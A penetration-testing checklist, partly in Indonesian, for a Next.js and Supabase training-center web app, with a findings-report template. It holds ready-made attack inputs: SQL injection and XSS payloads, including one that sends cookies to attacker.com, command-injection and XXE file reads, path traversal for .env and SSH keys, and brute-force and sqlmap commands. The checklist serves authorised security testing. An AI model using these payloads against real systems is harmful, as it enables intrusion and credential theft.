# 🎯 Penetration Testing Checklist - GARUDA-21 Training Center

Checklist komprehensif untuk penetration testing aplikasi.

---

## 📋 INFORMASI APLIKASI

**Application:** GARUDA-21 Training Center  
**Tech Stack:** Next.js 14 + TypeScript + Supabase (PostgreSQL)  
**Environment:** Production / Staging  
**Test Date:** _____________  
**Tester:** _____________

---

## 🔍 RECONNAISSANCE & INFORMATION GATHERING

### Passive Information Gathering

- [ ] **Subdomain Enumeration**
  ```bash
  amass enum -d garuda-21.com
  subfinder -d garuda-21.com
  ```

- [ ] **DNS Records**
  ```bash
  dig garuda-21.com ANY
  nslookup garuda-21.com
  ```

- [ ] **WHOIS Information**
  ```bash
  whois garuda-21.com
  ```

- [ ] **Search Engine Reconnaissance**
  - [ ] Google Dorks: `site:garuda-21.com filetype:pdf`
  - [ ] Check Wayback Machine
  - [ ] Search for exposed credentials in GitHub/GitLab

- [ ] **Technology Stack Detection**
  ```bash
  whatweb https://garuda-21.com
  wappalyzer https://garuda-21.com
  ```

### Active Information Gathering

- [ ] **Port Scanning**
  ```bash
  nmap -sV -sC -A garuda-21.com
  nmap -p- garuda-21.com # Full port scan
  ```

- [ ] **Service Enumeration**
  - [ ] HTTP/HTTPS (80, 443)
  - [ ] PostgreSQL (5432) - shouldn't be exposed!
  - [ ] SSH (22)

- [ ] **SSL/TLS Testing**
  ```bash
  sslscan garuda-21.com
  testssl.sh garuda-21.com
  ```
  - [ ] Check SSL Labs grade (should be A or A+)
  - [ ] Verify HSTS header
  - [ ] Check for outdated protocols (SSLv2, SSLv3, TLS 1.0)

---

## 🔐 AUTHENTICATION & SESSION MANAGEMENT

### Authentication Testing

- [ ] **Username Enumeration**
  - [ ] Test login with valid/invalid emails
  - [ ] Check different error messages
  - [ ] Test forgot password function
  
- [ ] **Password Policy**
  - [ ] Test weak passwords (123456, password, admin)
  - [ ] Test password length requirements
  - [ ] Test password complexity
  - [ ] Test for default credentials (admin/admin)

- [ ] **Brute Force Attack**
  ```bash
  # Hydra
  hydra -l admin@garuda-21.com -P passwords.txt https-post-form "/:username=^USER^&password=^PASS^:F=incorrect"
  
  # Burp Intruder
  # Use common password list
  ```
  - [ ] Verify rate limiting is working
  - [ ] Check account lockout policy
  - [ ] Test CAPTCHA bypass

- [ ] **Multi-Factor Authentication**
  - [ ] Check if MFA is enforced for admin
  - [ ] Test MFA bypass techniques

- [ ] **OAuth/SSO Testing** (if implemented)
  - [ ] Test redirect_uri manipulation
  - [ ] Test state parameter
  - [ ] Test token leakage

### Session Management

- [ ] **Cookie Security**
  - [ ] Check HttpOnly flag
  - [ ] Check Secure flag
  - [ ] Check SameSite attribute
  - [ ] Test cookie expiration
  
- [ ] **Session Fixation**
  - [ ] Test if session ID changes after login
  - [ ] Test session ID in URL
  
- [ ] **Session Timeout**
  - [ ] Test idle timeout
  - [ ] Test absolute timeout
  
- [ ] **Concurrent Sessions**
  - [ ] Test multiple sessions per user
  - [ ] Test session termination

- [ ] **Logout Function**
  - [ ] Verify session is destroyed
  - [ ] Test accessing protected pages after logout
  - [ ] Check for session token invalidation

---

## 🛡️ AUTHORIZATION & ACCESS CONTROL

### Horizontal Privilege Escalation

- [ ] **IDOR (Insecure Direct Object Reference)**
  ```bash
  # Test accessing other user's data
  GET /api/enrollments/123 # User A's enrollment
  GET /api/enrollments/456 # User B's enrollment (should fail)
  
  # Test modifying other user's data
  PUT /api/participants/123
  DELETE /api/certificates/456
  ```
  
  **Test on:**
  - [ ] `/api/enrollments/*`
  - [ ] `/api/participants/*`
  - [ ] `/api/certificates/*`
  - [ ] `/api/tickets/*`
  - [ ] `/api/referral/*`

### Vertical Privilege Escalation

- [ ] **Admin Function Access**
  ```bash
  # Access admin endpoints as regular user
  GET /api/admin/certificate-templates
  POST /api/admin/participants/reset-password
  GET /admin/dashboard
  ```
  
  **Test admin endpoints:**
  - [ ] `/api/admin/certificate-templates`
  - [ ] `/api/admin/certificate-requirements`
  - [ ] `/api/admin/certificate-signatories`
  - [ ] `/api/admin/participants/reset-password`
  - [ ] `/api/admin/short-links`
  - [ ] `/api/admin/referral-policies`

- [ ] **Role Manipulation**
  ```bash
  # Try to set role=admin during registration
  POST /api/signup-without-email-confirmation
  {
    "email": "test@test.com",
    "password": "Test123!",
    "fullName": "Test User",
    "role": "admin"  # Mass assignment
  }
  ```

- [ ] **Parameter Tampering**
  - [ ] Modify user_id in requests
  - [ ] Modify role in profile update
  - [ ] Modify price in enrollment

### Path Traversal

- [ ] **File Access**
  ```bash
  # Test directory traversal
  GET /api/certificate/../../../../etc/passwd
  GET /download?file=../../../.env
  ```

---

## 💉 INPUT VALIDATION

### SQL Injection

- [ ] **Authentication Bypass**
  ```sql
  ' OR '1'='1
  admin'--
  ' OR 1=1--
  ```

- [ ] **Union-Based SQL Injection**
  ```bash
  sqlmap -u "https://garuda-21.com/api/search?q=test" --batch
  sqlmap -u "https://garuda-21.com/api/programs?id=1" --dbs
  ```

- [ ] **Blind SQL Injection**
  ```sql
  ' AND SLEEP(5)--
  ' AND 1=1--
  ' AND 1=2--
  ```

- [ ] **Test Points:**
  - [ ] Search functionality
  - [ ] Filter parameters
  - [ ] Sort parameters
  - [ ] ID parameters
  - [ ] RPC functions (Supabase)

### Cross-Site Scripting (XSS)

- [ ] **Reflected XSS**
  ```javascript
  <script>alert('XSS')</script>
  <img src=x onerror=alert('XSS')>
  <svg onload=alert('XSS')>
  ```
  
  **Test on:**
  - [ ] Search functionality
  - [ ] Error messages
  - [ ] URL parameters

- [ ] **Stored XSS**
  ```javascript
  // Test in profile fields
  Full Name: <script>alert('XSS')</script>
  Bio: <img src=x onerror=document.location='http://attacker.com/steal?cookie='+document.cookie>
  
  // Test in forum posts
  Message: <svg onload=alert('XSS')>
  
  // Test in certificates
  Participant Name: <script>alert('XSS')</script>
  ```
  
  **Test fields:**
  - [ ] User profile (name, bio, etc)
  - [ ] Forum posts/comments
  - [ ] Ticket messages
  - [ ] Program descriptions
  - [ ] Certificate fields

- [ ] **DOM-Based XSS**
  - [ ] Test client-side routing
  - [ ] Test URL hash parameters
  - [ ] Check for `innerHTML`, `eval()`, `document.write()`

### Command Injection

- [ ] **OS Command Injection**
  ```bash
  ; ls -la
  | whoami
  `id`
  $(cat /etc/passwd)
  ```
  
  **Test on:**
  - [ ] File operations
  - [ ] Export functions
  - [ ] PDF generation
  - [ ] Email sending

### File Upload Vulnerabilities

- [ ] **Unrestricted File Upload**
  ```bash
  # Test uploading:
  - shell.php
  - shell.jsp
  - shell.aspx
  - malware.exe
  - huge-file.bin (10GB)
  ```

- [ ] **File Type Bypass**
  ```bash
  # Double extension
  shell.php.jpg
  
  # Null byte injection
  shell.php%00.jpg
  
  # Content-Type manipulation
  Content-Type: image/jpeg (but upload PHP)
  
  # Magic bytes manipulation
  # Add JPEG header to PHP file
  ```

- [ ] **Path Traversal in Upload**
  ```bash
  filename: ../../shell.php
  filename: ../../../.ssh/authorized_keys
  ```

- [ ] **Test upload endpoints:**
  - [ ] `/api/forum/upload`
  - [ ] `/api/assignment/upload`
  - [ ] `/api/admin/certificate-templates` (PDF upload)
  - [ ] Avatar upload

### XML External Entity (XXE)

- [ ] **Test XML parsers** (if any)
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <foo>&xxe;</foo>
  ```

---

## 🔒 BUSINESS LOGIC VULNERABILITIES

### E-Commerce/Payment Flow

- [ ] **Price Manipulation**
  ```bash
  # Modify price in enrollment
  POST /api/enrollments
  {
    "program_id": "xxx",
    "amount": -1  # Negative price
  }
  ```

- [ ] **Referral System Abuse**
  - [ ] Test self-referral
  - [ ] Test duplicate referral usage
  - [ ] Test expired referral codes
  - [ ] Manipulate referral rewards

- [ ] **Discount Code Abuse**
  - [ ] Test multiple discount codes
  - [ ] Test expired codes
  - [ ] Test code reuse
  - [ ] 100%+ discount

### Enrollment Flow

- [ ] **Race Condition**
  ```bash
  # Enroll in program multiple times simultaneously
  for i in {1..10}; do
    curl -X POST /api/enrollments &
  done
  ```

- [ ] **Capacity Bypass**
  - [ ] Enroll when program is full
  - [ ] Test concurrent enrollments

### Certificate Generation

- [ ] **Certificate Forgery**
  - [ ] Generate certificate without completing course
  - [ ] Modify certificate data
  - [ ] Duplicate certificates
  - [ ] Download other user's certificates

---

## 📡 API SECURITY

### REST API Testing

- [ ] **HTTP Methods**
  ```bash
  # Test unexpected methods
  OPTIONS /api/enrollments
  TRACE /api/admin/users
  PUT /api/readonly-resource
  DELETE /api/protected-resource
  ```

- [ ] **API Authentication**
  - [ ] Test missing Authorization header
  - [ ] Test invalid tokens
  - [ ] Test expired tokens
  - [ ] Test token in URL (token leakage)

- [ ] **Rate Limiting**
  ```bash
  # Rapid fire requests
  for i in {1..1000}; do
    curl https://garuda-21.com/api/login &
  done
  ```
  
  **Test on:**
  - [ ] Login endpoint (should be low limit)
  - [ ] Registration endpoint
  - [ ] Password reset
  - [ ] API calls

- [ ] **CORS Misconfiguration**
  ```bash
  # Test from different origin
  curl -H "Origin: https://evil.com" \
       -H "Access-Control-Request-Method: POST" \
       -X OPTIONS https://garuda-21.com/api/users
  ```

- [ ] **Mass Assignment**
  - [ ] Add unexpected fields to requests
  - [ ] Test modifying protected fields

### GraphQL (if applicable)

- [ ] Introspection query
- [ ] Nested queries (DoS)
- [ ] Batch queries

---

## 🗄️ DATABASE SECURITY

### Supabase/PostgreSQL

- [ ] **Row Level Security (RLS)**
  ```sql
  -- Test as User A
  SELECT * FROM participants WHERE user_id = 'USER_B_ID';
  -- Should return 0 rows
  
  -- Test policy bypass
  UPDATE participants SET role='admin' WHERE user_id = auth.uid();
  ```

- [ ] **Exposed Database**
  ```bash
  # Check if PostgreSQL port is exposed
  nmap -p 5432 garuda-21.com
  
  # Try direct connection
  psql -h db.xxx.supabase.co -U postgres
  ```

- [ ] **Service Role Key Exposure**
  - [ ] Check client-side code for keys
  - [ ] Check error messages
  - [ ] Check public repos

- [ ] **Data Leakage**
  - [ ] Excessive data exposure in API responses
  - [ ] Sensitive data in error messages
  - [ ] PII in logs

---

## 📤 FILE DOWNLOAD & EXPORT

- [ ] **Arbitrary File Download**
  ```bash
  GET /api/download?file=../../../../etc/passwd
  GET /api/certificate/download?id=../../../.env
  ```

- [ ] **PDF Injection**
  - [ ] Test malicious PDF generation
  - [ ] XSS in PDF
  - [ ] Path traversal in PDF

---

## 🌐 CLIENT-SIDE SECURITY

### JavaScript Security

- [ ] **Sensitive Data in JavaScript**
  - [ ] API keys in source code
  - [ ] Secrets in environment variables
  - [ ] Hardcoded credentials

- [ ] **Source Map Exposure**
  ```bash
  curl https://garuda-21.com/_next/static/chunks/main.js.map
  ```

### Browser Security

- [ ] **Clickjacking**
  ```html
  <iframe src="https://garuda-21.com/admin"></iframe>
  ```
  - [ ] Check X-Frame-Options header
  - [ ] Check CSP frame-ancestors

- [ ] **CSRF (Cross-Site Request Forgery)**
  ```html
  <form action="https://garuda-21.com/api/admin/delete-user" method="POST">
    <input type="hidden" name="userId" value="victim-id">
  </form>
  <script>document.forms[0].submit();</script>
  ```

- [ ] **Open Redirect**
  ```bash
  /login?redirect=https://evil.com
  /oauth/callback?return_to=//evil.com
  ```

---

## 📧 EMAIL SECURITY

- [ ] **Email Header Injection**
  ```
  to: victim@example.com%0ACc:attacker@evil.com
  ```

- [ ] **Email Template Injection**
  - [ ] XSS in email body
  - [ ] HTML injection

- [ ] **Password Reset Poisoning**
  ```bash
  POST /forgot-password
  Host: evil.com  # Host header injection
  ```

---

## 🔍 INFORMATION DISCLOSURE

- [ ] **Error Messages**
  - [ ] Stack traces
  - [ ] Database errors
  - [ ] File paths

- [ ] **Verbose Headers**
  - [ ] Server version
  - [ ] X-Powered-By
  - [ ] Technology stack

- [ ] **Debug/Development Features**
  ```bash
  /_next/webpack-hmr
  /api/debug
  /.git/
  /.env
  /package.json
  ```

- [ ] **Backup Files**
  ```bash
  /backup.sql
  /database.sql.bak
  /.env.backup
  ```

- [ ] **Sensitive Files Exposure**
  ```bash
  /.git/config
  /package.json
  /next.config.js
  /.env.local
  ```

---

## 🚀 DENIAL OF SERVICE

### Application-Level DoS

- [ ] **Large Payload**
  ```bash
  # Send huge JSON
  POST /api/enrollments
  { "data": "A" * 10000000 }
  ```

- [ ] **Regex DoS (ReDoS)**
  - [ ] Test email validation with catastrophic backtracking
  - [ ] Test search with complex patterns

- [ ] **Infinite Loop**
  - [ ] Recursive requests
  - [ ] Circular references

### Resource Exhaustion

- [ ] **File Upload DoS**
  - [ ] Upload 10GB file
  - [ ] Upload thousands of files

- [ ] **Database Query DoS**
  - [ ] Complex queries with no limit
  - [ ] Nested joins

---

## 🔐 SECURITY HEADERS CHECK

```bash
curl -I https://garuda-21.com
```

- [ ] `Strict-Transport-Security: max-age=31536000; includeSubDomains`
- [ ] `X-Frame-Options: SAMEORIGIN`
- [ ] `X-Content-Type-Options: nosniff`
- [ ] `X-XSS-Protection: 1; mode=block`
- [ ] `Content-Security-Policy: default-src 'self'`
- [ ] `Referrer-Policy: strict-origin-when-cross-origin`
- [ ] `Permissions-Policy: geolocation=(), microphone=(), camera=()`

---

## 📱 MOBILE/API TESTING

- [ ] **JWT Token Security**
  - [ ] Token expiration
  - [ ] Token in localStorage (should use httpOnly cookies)
  - [ ] Token signature verification

- [ ] **API Versioning**
  - [ ] Test old API versions
  - [ ] Test version bypass

---

## 🎯 SOCIAL ENGINEERING

- [ ] **Registration Email**
  - [ ] Check for sensitive info in welcome email
  - [ ] Test email spoofing

- [ ] **Error Messages**
  - [ ] User enumeration via error messages
  - [ ] Information disclosure

---

## 📊 AUTOMATED SCANNING

### OWASP ZAP

```bash
# Passive scan
zap-cli --zap-url http://localhost:8080 open-url https://garuda-21.com
zap-cli --zap-url http://localhost:8080 spider https://garuda-21.com
zap-cli --zap-url http://localhost:8080 active-scan https://garuda-21.com

# Generate report
zap-cli --zap-url http://localhost:8080 report -o report.html -f html
```

### Burp Suite Professional

- [ ] Active scan
- [ ] Passive scan
- [ ] Intruder for brute force
- [ ] Repeater for manual testing

### Nikto

```bash
nikto -h https://garuda-21.com
```

### SQLMap

```bash
sqlmap -u "https://garuda-21.com/api/programs?id=1" --batch --risk=3 --level=5
```

---

## 📝 REPORTING

### Critical Findings Template

```markdown
### [CRITICAL] Broken Authentication - Admin API Accessible Without Authentication

**Severity:** Critical
**CVSS Score:** 9.8

**Description:**
Admin API endpoints are accessible without authentication, allowing any user to perform administrative actions.

**Steps to Reproduce:**
1. Navigate to https://garuda-21.com/api/admin/participants/reset-password
2. Send POST request without authentication
3. Observe that password is reset

**Impact:**
- Complete account takeover
- Data breach
- Unauthorized access to all user data

**Remediation:**
Implement authentication middleware on all admin routes.

**Proof of Concept:**
```bash
curl -X POST https://garuda-21.com/api/admin/participants/reset-password \
  -H "Content-Type: application/json" \
  -d '{"userId": "victim-user-id"}'
```

**References:**
- CWE-306: Missing Authentication for Critical Function
- OWASP A01:2021 – Broken Access Control
```

---

## ✅ POST-TEST CHECKLIST

- [ ] All findings documented
- [ ] Severity ratings assigned (Critical/High/Medium/Low)
- [ ] Remediation recommendations provided
- [ ] Proof-of-concepts included
- [ ] Screenshots/videos captured
- [ ] Report reviewed
- [ ] Report delivered to client

---

## 📞 EMERGENCY CONTACTS

**In case of critical finding:**
1. Stop testing immediately
2. Document the finding
3. Contact the client
4. Do not exploit further

---

**Prepared by:** Security Team  
**Version:** 1.0  
**Last Updated:** $(date)

---

## 🎓 REFERENCES

- OWASP Testing Guide v4.2
- OWASP Top 10 2021
- PTES (Penetration Testing Execution Standard)
- NIST SP 800-115
- CWE Top 25 Most Dangerous Software Weaknesses

